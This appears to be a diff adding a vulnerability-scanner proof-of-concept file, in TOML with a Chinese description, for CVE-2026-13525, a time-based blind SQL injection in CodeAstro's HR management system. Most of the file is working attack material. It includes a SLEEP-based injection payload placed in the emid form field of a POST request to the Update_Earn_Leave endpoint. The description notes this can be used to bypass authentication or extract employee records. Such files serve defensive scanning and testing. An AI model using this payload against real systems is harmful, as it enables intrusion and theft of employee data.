@@ -1,0 +1,55 @@
+[info]
+id = "POC-AVE-2026-0020"
+name = "CodeAstro HRMS Update_Earn_Leave SQL注入 PoC"
+author = "AVE"
+severity = "medium"
+tags = ["sqli", "cve-2026-13525", "codeastro", "hrms", "cwe-89", "cwe-74", "time-based-blind"]
+description = "CodeAstro Human Resource Management System 中 /hrsystem/leave/Update_Earn_Leave 接口的 emid 参数存在时间盲 SQL 注入漏洞。"Employee_model.php"中 emselectByCode() 函数直接拼接 emid 参数至 SQL 查询，未经任何过滤或参数化处理。攻击者可通过构造包含 SLEEP 的 SQL payload 实现延时注入，进而绕过认证或提取数据库中员工信息。"
+vuln_id = ["CVE-2026-13525", "AVE-2026-0020"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/hrsystem/leave/Update_Earn_Leave"
+
+headers.Content-Type = "application/x-www-form-urlencoded"
+
+body.type = "form"
+body.emid = "1"
+body.startdate = "2024-01-01"
+body.enddate = "2024-01-01"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["Earn", "Leave", "leave"]
+expect = true
+
+[[poc.requests]]
+method = "POST"
+path = "/hrsystem/leave/Update_Earn_Leave"
+
+headers.Content-Type = "application/x-www-form-urlencoded"
+
+body.type = "form"
+body.emid = "1' AND (SELECT 2361 FROM (SELECT(SLEEP(5)))vRnL)-- rMVG"
+body.startdate = "2024-01-01"
+body.enddate = "2024-01-01"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["Earn", "Leave", "leave"]
+expect = true
